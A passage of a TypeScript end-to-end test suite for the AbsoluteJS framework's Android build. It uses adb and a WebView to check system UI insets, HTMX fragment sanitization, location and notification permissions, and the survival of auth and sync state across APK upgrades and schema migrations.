			await clickSystemUi('#system-ui-show');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'System bars shown'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await waitForStatusBar(true);
			const shownLayout = await webview.evaluate<{
				envTop: number;
				insetTop: number;
			}>(`(() => {
				const probe = document.createElement('div');
				probe.style.paddingTop = 'env(safe-area-inset-top, 0px)';
				document.body.append(probe);
				const envTop = parseFloat(getComputedStyle(probe).paddingTop) || 0;
				probe.remove();
				return {
					envTop,
					insetTop: parseFloat(getComputedStyle(document.documentElement).getPropertyValue('--safe-area-inset-top')) || 0
				};
			})()`);
			const shownWebViewBounds = androidWebViewBounds();
			expect(
				shownLayout.envTop > 0 ||
					shownLayout.insetTop > 0 ||
					shownWebViewBounds.top > 0
			).toBe(true);

			const originalRotation = Number(
				requireAdbShell('settings', 'get', 'system', 'user_rotation')
			);
			const targetRotation = originalRotation % 2 === 0 ? 1 : 0;
			try {
				requireAdbShell(
					'settings',
					'put',
					'system',
					'accelerometer_rotation',
					'0'
				);
				requireAdbShell(
					'settings',
					'put',
					'system',
					'user_rotation',
					String(targetRotation)
				);
				await webview.waitFor<boolean>(
					targetRotation % 2 === 1
						? 'innerWidth > innerHeight'
						: 'innerHeight > innerWidth',
					{ timeoutMs: TIMEOUT_MS }
				);
				expect(
					await webview.evaluate<string | null>(
						`document.querySelector('[data-system-bars]')?.getAttribute('data-system-bars') ?? null`
					)
				).toBe('native');
			} finally {
				requireAdbShell(
					'settings',
					'put',
					'system',
					'user_rotation',
					String(originalRotation)
				);
				requireAdbShell(
					'settings',
					'put',
					'system',
					'accelerometer_rotation',
					'1'
				);
			}

			await webview.close();
			await android.relaunch();
			webview = await attachAbsoluteAndroidWebView({
				adb: project.adb,
				appId: 'com.absolutejs.conformance',
				serial: android.serial,
				timeoutMs: TIMEOUT_MS
			});
			await openNativeRoute('/native-system-ui', 'AbsoluteJS System UI');
			await clickSystemUi('#system-ui-query');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-system-bars]')?.getAttribute('data-system-bars') === 'native'`,
				{ timeoutMs: TIMEOUT_MS }
			);
		}
	);

	nativeTest(
		'routes HTMX to the backend and sanitizes returned fragments',
		async () => {
			await openNativeRoute('/htmx', 'AbsoluteJS + HTMX');
			await webview.waitFor<boolean>(
				`document.querySelector('#count')?.textContent?.trim() === '0'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			const requested = await webview.evaluate<boolean>(`(() => {
			const target = document.createElement('div');
			target.id = 'native-fragment-target';
			document.body.appendChild(target);
			window.__ABS_BAD_SCRIPT__ = false;
			window.__ABS_BAD_HANDLER__ = false;
			window.htmx.ajax('GET', ${JSON.stringify(`${PRODUCTION_ORIGIN}/__absolute/native-fragment`)}, {
				target: '#native-fragment-target',
				swap: 'innerHTML'
			});
			return true;
		})()`);
			expect(requested).toBe(true);
			await waitForText('Native fragment safe');
			const boundary =
				await webview.evaluate<NativeFragmentBoundary>(`(() => ({
			handlerExecuted: window.__ABS_BAD_HANDLER__ === true,
			safeAction: document.querySelector('#safe-fragment-action')?.getAttribute('hx-post') ?? null,
			scriptExecuted: window.__ABS_BAD_SCRIPT__ === true,
			unsafeAction: document.querySelector('#unsafe-fragment-action')?.getAttribute('hx-post') ?? null
		}))()`);
			expect(boundary).toEqual({
				handlerExecuted: false,
				safeAction: `${PRODUCTION_ORIGIN}/htmx/increment`,
				scriptExecuted: false,
				unsafeAction: null
			});
		}
	);

	nativeTest(
		'uses the provider-neutral foreground location contract and cleans up watches',
		async () => {
			const opened = await webview.evaluate<boolean>(`(() => {
				const anchor = document.createElement('a');
				anchor.href = '/native-location';
				anchor.textContent = 'Native location';
				document.body.appendChild(anchor);
				anchor.click();
				return true;
			})()`);
			expect(opened).toBe(true);
			await waitForText('AbsoluteJS Foreground Location');
			const click = async (selector: string) => {
				const clicked = await webview.evaluate<boolean>(`(() => {
					const button = document.querySelector(${JSON.stringify(selector)});
					if (!(button instanceof HTMLButtonElement)) return false;
					button.click();
					return true;
				})()`);
				expect(clicked).toBe(true);
			};

			await click('#location-query');
			await webview.waitFor<boolean>(
				`document.querySelector('#location-detail')?.textContent === 'Location capability and permission queried'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			expect(
				await webview.evaluate<string | null>(
					`document.querySelector('[data-capability]')?.getAttribute('data-capability') ?? null`
				)
			).toBe('native');

			await click('#location-current');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-error]')?.getAttribute('data-error') === 'permission-required'`,
				{ timeoutMs: TIMEOUT_MS }
			);

			for (const permission of [
				'android.permission.ACCESS_COARSE_LOCATION',
				'android.permission.ACCESS_FINE_LOCATION'
			]) {
				const granted = Bun.spawnSync([
					project.adb,
					'-s',
					android.serial,
					'shell',
					'pm',
					'grant',
					'com.absolutejs.conformance',
					permission
				]);
				expect(granted.exitCode).toBe(0);
			}
			const setLocation = (longitude: number, latitude: number) => {
				const located = Bun.spawnSync([
					project.adb,
					'-s',
					android.serial,
					'emu',
					'geo',
					'fix',
					String(longitude),
					String(latitude)
				]);
				expect(located.exitCode).toBe(0);
			};
			await click('#location-query');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-permission]')?.getAttribute('data-permission') === 'granted'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#location-watch');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-active]')?.getAttribute('data-active') === 'true'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			setLocation(-122.084, 37.422);
			await webview.waitFor<boolean>(
				`Number(document.querySelector('[data-updates]')?.getAttribute('data-updates') ?? '0') > 0`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#location-stop');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-active]')?.getAttribute('data-active') === 'false'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#location-current');
			await webview.waitFor<boolean>(
				`document.querySelector('#location-detail')?.textContent === 'Current location received'`,
				{ timeoutMs: TIMEOUT_MS }
			);

			const initialUpdates = await webview.evaluate<number>(
				`Number(document.querySelector('[data-updates]')?.getAttribute('data-updates') ?? '0')`
			);
			await click('#location-watch');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-active]')?.getAttribute('data-active') === 'true'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			setLocation(-122.085, 37.423);
			await webview.waitFor<boolean>(
				`Number(document.querySelector('[data-updates]')?.getAttribute('data-updates') ?? '0') > ${initialUpdates}`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#location-stop');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-active]')?.getAttribute('data-active') === 'false'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			const stoppedCount = await webview.evaluate<number>(
				`Number(document.querySelector('[data-updates]')?.getAttribute('data-updates') ?? '0')`
			);
			setLocation(-122.086, 37.424);
			await Bun.sleep(2_000);
			expect(
				await webview.evaluate<number>(
					`Number(document.querySelector('[data-updates]')?.getAttribute('data-updates') ?? '0')`
				)
			).toBe(stoppedCount);
			await click('#location-stop');
		}
	);

	nativeTest(
		'uses provider-neutral local notifications without implicit permission or exact alarms',
		async () => {
			const opened = await webview.evaluate<boolean>(`(() => {
				const anchor = document.createElement('a');
				anchor.href = '/native-notifications';
				anchor.textContent = 'Native notifications';
				document.body.appendChild(anchor);
				anchor.click();
				return true;
			})()`);
			expect(opened).toBe(true);
			await waitForText('AbsoluteJS Local Notifications');
			const click = async (selector: string) => {
				const clicked = await webview.evaluate<boolean>(`(() => {
					const button = document.querySelector(${JSON.stringify(selector)});
					if (!(button instanceof HTMLButtonElement)) return false;
					button.click();
					return true;
				})()`);
				expect(clicked).toBe(true);
			};

			await click('#notifications-query');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-capability]')?.getAttribute('data-capability') === 'native'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#notifications-schedule');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-error]')?.getAttribute('data-error') === 'permission-required'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			const granted = Bun.spawnSync([
				project.adb,
				'-s',
				android.serial,
				'shell',
				'pm',
				'grant',
				'com.absolutejs.conformance',
				'android.permission.POST_NOTIFICATIONS'
			]);
			expect(granted.exitCode).toBe(0);
			await click('#notifications-query');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-permission]')?.getAttribute('data-permission') === 'granted'`,
				{ timeoutMs: TIMEOUT_MS }
			);

			await click('#notifications-schedule');
			await click('#notifications-pending');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-pending]')?.getAttribute('data-pending') === '1'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await click('#notifications-cancel');
			await click('#notifications-pending');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-pending]')?.getAttribute('data-pending') === '0'`,
				{ timeoutMs: TIMEOUT_MS }
			);

			await click('#notifications-schedule');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-event]')?.getAttribute('data-event') === 'received:20260826'`,
				{ timeoutMs: 30_000 }
			);
			const manifest = await readFile(
				resolve(
					PROJECT_ROOT,
					'.absolutejs/mobile-native-conformance/native/android/app/src/main/AndroidManifest.xml'
				),
				'utf8'
			);
			expect(manifest).toContain('android.permission.POST_NOTIFICATIONS');
			expect(manifest).not.toContain('SCHEDULE_EXACT_ALARM');
			expect(manifest).not.toContain('USE_EXACT_ALARM');
		}
	);

	nativeTest(
		'provisions native Auth and authenticated Sync without page-specific native code',
		async () => {
			await ensureNativeAuthSyncAcceptance();
			expect(nativeAuthAuthorizationRequests).toBe(1);
			expect(nativeAuthTokenRequests).toBeGreaterThanOrEqual(1);
			expect(nativeAuthUserInfoRequests).toBeGreaterThanOrEqual(1);
			expect(nativeSyncConnections).toBeGreaterThanOrEqual(2);
			expect(nativeSyncTicketsIssued).toBeGreaterThanOrEqual(2);
			expect(nativeSyncTicketsConsumed).toBeGreaterThanOrEqual(2);
		}
	);

	nativeTest(
		'preserves Auth, Sync SQLite, and the durable outbox across an installed APK upgrade',
		async () => {
			await ensureNativeAuthSyncAcceptance();
			const queued = await webview.evaluate<boolean>(`(() => {
				const button = document.querySelector('#native-sync-queue');
				if (!(button instanceof HTMLButtonElement)) return false;
				button.click();
				return true;
			})()`);
			expect(queued).toBe(true);
			await webview.waitFor<boolean>(
				`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0) > 0`,
				{ timeoutMs: TIMEOUT_MS }
			);

			compatibilityGeneration = 'n+1';
			await openNativeRoute('/react', 'AbsoluteJS + React');
			compatibilityGeneration = 'n+2';
			await openNativeRoute('/vue', 'AbsoluteJS + Vue');
			compatibilityGeneration = 'n+3';
			await openNativeRoute(
				'/react',
				'This app version must be updated to continue.'
			);
			compatibilityGeneration = 'rollback';
			await openNativeRoute('/react', 'AbsoluteJS + React');

			const installed = await inspectAbsoluteAndroidInstalledApp(
				project.adb,
				android.serial,
				project.config.appId,
				captureUpgradeCommand
			);
			if (installed.versionCode === undefined)
				throw new Error(
					'The installed Android versionCode is unavailable.'
				);
			const nextVersionCode = installed.versionCode + 1;
			const appGradlePath = resolve(
				project.nativeDirectory,
				'app/build.gradle'
			);
			const appGradle = await readFile(appGradlePath, 'utf8');
			const upgradedGradle = appGradle.replace(
				/\bversionCode\s+\d+/u,
				`versionCode ${nextVersionCode}`
			);
			if (upgradedGradle === appGradle)
				throw new Error(
					'Could not advance the Android fixture versionCode.'
				);
			await writeFile(appGradlePath, upgradedGradle);
			let authRestored = false;
			let syncRestored = false;
			let pendingRestored = false;
			const buildAndVerifyUpgrade = async () => {
				const built = await buildAbsoluteAndroidGradleArtifact({
					project,
					task: 'assembleDebug'
				});

				return runAbsoluteAndroidUpgradeConformance({
					adb: project.adb,
					apkPath: built.installPath,
					appId: project.config.appId,
					compatibility: {
						nPlusOne: 'compatible',
						nPlusThree: 'upgrade-required',
						nPlusTwo: 'compatible',
						rollback: 'compatible'
					},
					run: captureUpgradeCommand,
					serial: android.serial,
					afterInstall: async () => {
						await webview.close();
						await android.relaunch();
						webview = await attachAbsoluteAndroidWebView({
							adb: project.adb,
							appId: project.config.appId,
							serial: android.serial,
							timeoutMs: TIMEOUT_MS
						});
						await waitForText('AbsoluteJS + React');
						await openNativeRoute(
							'/native-auth-sync',
							'AbsoluteJS Native Auth + Sync'
						);
						await waitForText('Native auth + sync complete');
						authRestored = true;
						syncRestored = true;
						await webview.waitFor<boolean>(
							`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0) > 0`,
							{ timeoutMs: TIMEOUT_MS }
						);
						pendingRestored = true;
					},
					verifyState: async () => ({
						authCredential: authRestored,
						pendingOperations: pendingRestored,
						syncDatabase: syncRestored
					})
				});
			};
			const result = await buildAndVerifyUpgrade().finally(async () =>
				writeFile(appGradlePath, appGradle)
			);
			expect(result.outcome).toBe('pass');
			expect(result.after.versionCode).toBe(nextVersionCode);
			await mkdir(ARTIFACT_ROOT, { recursive: true });
			await writeFile(
				resolve(ARTIFACT_ROOT, 'android-upgrade-conformance.json'),
				`${JSON.stringify(result, null, 2)}\n`
			);
		}
	);

	nativeTest(
		'rolls back and recovers a failed generated Sync schema migration across an installed APK upgrade',
		async () => {
			await ensureNativeAuthSyncAcceptance();
			const pendingBefore = await webview.evaluate<number>(
				`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0)`
			);
			if (pendingBefore === 0) {
				const queued = await webview.evaluate<boolean>(`(() => {
					const button = document.querySelector('#native-sync-queue');
					if (!(button instanceof HTMLButtonElement)) return false;
					button.click();
					return true;
				})()`);
				expect(queued).toBe(true);
				await webview.waitFor<boolean>(
					`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0) > 0`,
					{ timeoutMs: TIMEOUT_MS }
				);
			}
			await webview.close();
			await android.relaunch();
			webview = await attachAbsoluteAndroidWebView({
				adb: project.adb,
				appId: project.config.appId,
				serial: android.serial,
				timeoutMs: TIMEOUT_MS
			});
			await openNativeRoute(
				'/native-auth-sync',
				'AbsoluteJS Native Auth + Sync'
			);
			await waitForText('Native auth + sync complete');
			await webview.waitFor<boolean>(
				`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0) > 0`,
				{ timeoutMs: TIMEOUT_MS }
			);

			const installed = await inspectAbsoluteAndroidInstalledApp(
				project.adb,
				android.serial,
				project.config.appId,
				captureUpgradeCommand
			);
			if (installed.versionCode === undefined)
				throw new Error(
					'The installed Android versionCode is unavailable.'
				);
			const packageJson = await readFile(PACKAGE_JSON_PATH, 'utf8');
			const appGradlePath = resolve(
				project.nativeDirectory,
				'app/build.gradle'
			);
			const appGradle = await readFile(appGradlePath, 'utf8');
			const startedAt = performance.now();
			const writeSchema = async (operation: {
				collection: string;
				from: string;
				to: string;
				type: 'rename-field';
			}) => {
				const manifest = JSON.parse(packageJson) as Record<
					string,
					unknown
				>;
				await writeFile(
					PACKAGE_JSON_PATH,
					`${JSON.stringify(
						{
							...manifest,
							absolutejs: {
								sync: {
									localSchema: {
										migrations: [
											{
												operations: [operation],
												toVersion: 2
											}
										],
										version: 2
									}
								}
							}
						},
						null,
						2
					)}\n`
				);
				await stopCompiledBackend();
				await runPrepare();
				await syncAndroidEmbeddedBundle();
				await startCompiledBackend();
			};
			const buildVersion = async (versionCode: number) => {
				const versioned = appGradle.replace(
					/\bversionCode\s+\d+/u,
					`versionCode ${versionCode}`
				);
				if (versioned === appGradle)
					throw new Error(
						'Could not advance the Android fixture versionCode.'
					);
				await writeFile(appGradlePath, versioned);

				return buildAbsoluteAndroidGradleArtifact({
					project,
					task: 'assembleDebug'
				});
			};
			const installAndRelaunch = async (apkPath: string) => {
				const result = await captureUpgradeCommand([
					project.adb,
					'-s',
					android.serial,
					'install',
					'-r',
					apkPath
				]);
				if (result.exitCode !== 0 || !result.stdout.includes('Success'))
					throw new Error(
						`Android in-place migration upgrade failed: ${result.stderr.trim() || result.stdout.trim()}`
					);
				await webview.close();
				compatibilityGeneration = 'current';
				let attachError: unknown;
				for (let attempt = 0; attempt < 2; attempt += 1) {
					await android.relaunch();
					try {
						webview = await attachAbsoluteAndroidWebView({
							adb: project.adb,
							appId: project.config.appId,
							serial: android.serial,
							timeoutMs: TIMEOUT_MS
						});

						return;
					} catch (error) {
						attachError = error;
					}
				}
				throw attachError;
			};

			try {
				await writeSchema({
					collection: 'native-acceptance',
					from: 'label',
					to: 'id',
					type: 'rename-field'
				});
				const badBuild = await buildVersion(installed.versionCode + 1);
				await installAndRelaunch(badBuild.installPath);
				await webview.waitFor<boolean>(
					`Reflect.get(globalThis, Symbol.for('absolutejs.mobile.sync.schema-state'))?.state === 'failed'`,
					{ timeoutMs: TIMEOUT_MS }
				);
				const failedAttempt = await webview.evaluate<{
					code: string;
					state: string;
					storedVersion?: number;
					targetVersion?: number;
				}>(
					`Reflect.get(globalThis, Symbol.for('absolutejs.mobile.sync.schema-state'))`
				);
				expect(failedAttempt).toEqual({
					code: 'INVALID_PLAN',
					state: 'failed'
				});

				await writeSchema({
					collection: 'native-acceptance',
					from: 'label',
					to: 'title',
					type: 'rename-field'
				});
				const recoveredBuild = await buildVersion(
					installed.versionCode + 2
				);
				await installAndRelaunch(recoveredBuild.installPath);
				await webview.waitFor<boolean>(
					`(() => {
						const status = Reflect.get(globalThis, Symbol.for('absolutejs.mobile.sync.schema-state'));
						return status?.state === 'ready' && status.storedVersion === 2 && status.targetVersion === 2;
					})()`,
					{ timeoutMs: TIMEOUT_MS }
				);
				await waitForText('AbsoluteJS + React');
				await openNativeRoute(
					'/native-auth-sync',
					'AbsoluteJS Native Auth + Sync'
				);
				await waitForText('Native auth + sync complete');
				await webview.waitFor<boolean>(
					`Number(document.querySelector('#native-auth-sync-status')?.getAttribute('data-pending') ?? 0) > 0`,
					{ timeoutMs: TIMEOUT_MS }
				);
				const result: AbsoluteNativeSyncMigrationResult = {
					durationMs: Math.round(performance.now() - startedAt),
					failedAttempt: {
						code: 'INVALID_PLAN'
					},
					outcome: 'pass',
					recovery: { storedVersion: 2, targetVersion: 2 },
					state: {
						authCredential: true,
						pendingOperations: true,
						rollbackPreserved: true,
						schemaAdvanced: true
					}
				};
				await mkdir(ARTIFACT_ROOT, { recursive: true });
				await writeFile(
					resolve(
						ARTIFACT_ROOT,
						'android-sync-migration-conformance.json'
					),
					`${JSON.stringify(result, null, 2)}\n`
				);
			} finally {
				await writeFile(PACKAGE_JSON_PATH, packageJson);
				await writeFile(appGradlePath, appGradle);
			}
		},
		900_000
	);
});
